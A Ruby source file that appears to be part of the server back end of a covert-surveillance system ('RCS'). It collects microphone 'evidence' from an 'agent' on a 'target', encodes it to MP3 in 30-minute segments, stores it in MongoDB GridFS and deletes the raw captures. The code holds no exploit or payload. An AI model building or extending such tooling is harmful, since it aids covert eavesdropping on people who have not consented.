require 'ffi'
require 'mongo'
require 'mongoid'
require 'stringio'

require 'rcs-common/trace'

require_relative 'speex'
require_relative 'wave'
require_relative 'src'
require_relative 'mp3lame'

module RCS
module Worker

  class MicRecording
    include Tracer

    attr_accessor :timecode, :duration, :sample_rate

    def initialize(evidence, agent, target)
      @target = target
      @mic_id = evidence[:data][:mic_id]
      @sample_rate = evidence[:data][:sample_rate]
      @timecode = tc evidence
      @duration = 0
      @raw_ids = []

      @evidence = store evidence[:da], agent, @target
    end

    def accept?(evidence)
      @mic_id == evidence[:data][:mic_id] and @duration < 1800 # split every 30 minutes
    end

    def file_name
      @mic_id.to_i.to_s
    end

    def tc(evidence)
      evidence[:da]
    end

    def close!
      @raw_ids.each do |id|
        RCS::DB::GridFS.delete(id, "evidence")
        trace :debug, "deleted raw evidence #{id}"
      end
    end

    def feed(evidence)
      @raw_ids << evidence[:db_id]

      @timecode = tc evidence
      @duration += evidence[:wav].size / @sample_rate

      left_pcm = Array.new evidence[:wav]
      right_pcm = Array.new evidence[:wav]

      @encoder ||= ::MP3Encoder.new(2, @sample_rate)
      unless @encoder.nil?
        @encoder.feed(left_pcm, right_pcm) do |mp3_bytes|
          File.open("#{file_name}.mp3", 'ab') {|f| f.write(mp3_bytes) }

          db = Mongoid.database
          fs = Mongo::GridFileSystem.new(db, "grid.#{@target[:_id]}")

          fs.open(file_name, 'a') do |f|
            f.write mp3_bytes
            update_attributes("data.duration" => @duration)
            update_attributes("data._grid" => f.files_id)
            update_attributes("data._grid_size" => f.file_length)
          end
        end
      end
    end

    def update_attributes(hash)
      @evidence.update_attributes hash
    end

    def store(acquired, agent, target)
      evidence = ::Evidence.collection_class(target[:_id].to_s)
      evidence.create do |ev|
        ev.aid = agent[:_id].to_s
        ev.type = :mic

        ev.da = acquired.to_i
        ev.dr = Time.now.to_i
        ev.rel = 0
        ev.blo = false
        ev.note = ""

        ev.data ||= Hash.new
        ev.data[:duration] = 0

        ev.save
      end
    end
  end

  class MicProcessor
    include Tracer

    def initialize(agent, target)
      @agent = agent
      @target = target
    end

    def tc(evidence)
      evidence[:da] - (evidence[:wav].size / evidence[:data][:sample_rate])
    end

    def feed(evidence)
      @mic ||= MicRecording.new(evidence, @agent, @target)
      unless @mic.accept? evidence
        puts "#{@mic.timecode} (#{@mic.timecode.to_f}) -> #{tc(evidence)} #{tc(evidence).to_f}"
        @mic.close!
        @mic = MicRecording.new(evidence, @agent, @target)
      end

      @mic.feed(evidence)
      nil
    end
  end

end
end